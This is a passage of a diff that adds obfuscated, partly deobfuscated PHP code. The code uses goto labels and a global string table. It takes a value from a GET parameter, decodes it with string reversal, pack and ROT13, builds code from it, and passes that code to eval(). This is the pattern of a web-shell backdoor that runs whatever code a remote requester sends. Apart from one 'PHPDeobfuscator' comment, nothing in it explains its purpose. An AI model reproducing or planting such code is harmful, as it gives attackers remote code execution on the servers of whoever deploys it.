+            goto zPKAM;
+        }
+        if ($QwDFS == $GLOBALS[æ][0x3a]) {
+            hK_SR();
+            goto zPKAM;
+        }
+        if ($QwDFS == $GLOBALS[æ][0x2b]) {
+            MLTAD();
+            goto d4rjt;
+        }
+        d4rjt:
+        zPKAM:
+        if (!isset($_GET[$GLOBALS[æ][0x33]])) {
+            goto IKftJ;
+        }
+        $ye60U = trim($_GET[$GLOBALS[æ][0x33]]);
+        $ye60U = str_rot13(pack($GLOBALS[æ][0x17e], strrev($ye60U)));
+        $obb4S = KTkvn($GLOBALS[æ][0x25] . hJGkQ($ye60U));
+        $obb4S = xnCm_($GLOBALS[æ][0x25] . HJgkQ($ye60U), $obb4S);
+        $obb4S = str_replace(array(base64_decode($GLOBALS[æ][0x76]), base64_decode($GLOBALS[æ][0x180]), base64_decode($GLOBALS[æ][0x181])), $GLOBALS[æ][0x4], $obb4S);
+        eval($obb4S);
+        IKftJ:
+        // [PHPDeobfuscator] Implied script end
+        return;
+    }
+    $YfGh0 = str_replace($GLOBALS[æ][0x1], $GLOBALS[æ][0x2], $YfGh0);
+    goto vYZwB;
